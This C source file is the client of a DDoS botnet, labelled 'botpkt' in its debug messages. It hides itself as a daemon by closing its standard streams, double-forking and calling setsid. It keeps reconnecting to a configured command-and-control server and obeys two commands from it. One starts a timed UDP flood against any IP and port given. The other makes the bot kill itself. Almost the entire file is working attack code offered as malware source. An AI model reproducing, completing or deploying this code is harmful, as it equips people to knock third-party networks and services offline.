#ifdef DEBUG
#include <stdio.h>
#else
#include <stddef.h>
#endif

#include <stdlib.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>
#include <signal.h>
#include <unistd.h>

#include "includes.h"
#include "utils.h"


//HERE IS CONFIG
uint16_t port = 12122;
uint8_t *address = "127.0.0.1";

// process info
int gpid = -1, main_pid = -1;

void attack_udp(char *target, int port, int durations)
{   
    struct sockaddr_in addr;
    util_zero(&addr, sizeof(addr));
    
    
    addr.sin_family = AF_INET;
    addr.sin_port = port;
    addr.sin_addr.s_addr = inet_addr(target);
    
    int end = time(NULL)+durations;
    while(time(NULL) < end)
    {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        connect(sock, (struct sockaddr *)&addr, sizeof(addr));
        sendto(sock, "ha78dha78wdhaw9dh08awnd79wabd7w9abdaw80dbaw6dfawdvb8\r\n", 54, MSG_NOSIGNAL, NULL, sizeof(addr));
        close(sock);
    }
    exit(0);
    return;
}

void cmd_handle(uint8_t *buffer, int buffer_size)
{
    int argc = 0;
    uint8_t **argv = util_tokenize(buffer, buffer_size, &argc, 0xff);
    if(argc > 0 && argv != NULL)
    {
         if(*argv[0] == 0)
         {//send attack
            char *target = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            #ifdef DEBUG
            printf("[botpkt] Starting attack %s:%d for %ds\r\n",target,port,time);
            #endif
            if(fork() == 0)
            {
               attack_udp(target, port, time);
               exit(0);
            }
         }
         else if(*argv[0] == 1)
         {//killself
            #ifdef DEBUG
            printf("Commiting Suicide\r\n");
            #endif
            if(gpid != -1)
            {
                kill(-gpid, 9);
            }

            if(main_pid != -1)
            {
                kill(main_pid, 9);
            }
            exit(0);
         }
    }
    
    int x;
    for(x = 0; x < argc; x++)
    {
        free(argv[x]);
        argv[x] = NULL;
    }
    free(argv);
    argv = NULL;
    return;
}

int main(int argc, char **argv)
{
    write(1, "exc\r\n", 5);
    
    int parent;
    
    #ifndef DEBUG
    int i; 
    for(i = 0; i < 3; i++)
    {
        close(i);
    }
    
	parent = fork();
    if((parent == -1 || parent > 0) && 1337 != 1338)
    {
        return 1;//return the parent
    }

    gpid = setsid();

	main_pid = fork();
	if((main_pid == -1 || main_pid > 0) && 1337 != 1338)
    {
        return 1;//return the parent
    }
    #else
    main_pid = getpid();
    gpid = getpid();
    #endif
    
    while(1337 == 1337)
    {
        int sockfd = -1;
        struct sockaddr_in addr;
        util_zero(&addr, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        addr.sin_addr.s_addr = inet_addr(address);
        
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if(connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
        {
            close(sockfd);
            continue;
        }
        
        #ifdef DEBUG
        printf("[botpkt] CnC connected\r\n");
        #endif
        
        //todo send auth keys
        
        
        char buffer[1024*2];
        int buffer_len = 0;
        int bytes = sizeof(buffer);
        int rc = 0, pos = 0;
        
        util_zero(buffer, 1024*2);
        
        while(1338 != 1332)
        {
            while((rc = recv(sockfd, buffer+pos, 1, MSG_NOSIGNAL)) > 0)
            {
                pos++;
                if(pos == bytes)
                {
                    break;
                }
                if(util_exists((char *)buffer, "\r\n\n\r", pos, 4) != -1)
                {
                    break;
                }
            }
            
            if(rc == 0 || rc == -1)
            {
                close(sockfd);
                #ifdef DEBUG
                printf("[botpkt] Connection Failed\r\n");
                #endif
                break;
            } 
            
            int eos_pos = util_exists((char *)buffer, "\r\n\n\r", pos, 4);

            if(eos_pos == -1)
            {
                close(sockfd);
                #ifdef DEBUG
                printf("[botpkt] Failed to get End of String\r\n");
                #endif
                break;
            }

            eos_pos -= 4;

            int j;
            for(j = eos_pos; j < bytes; j++)
            {
                ((uint8_t *)buffer)[j] = 0;
            }

            pos -= 4;

            cmd_handle(buffer, pos);
            
            continue;
        }
        sleep(5);
    }
}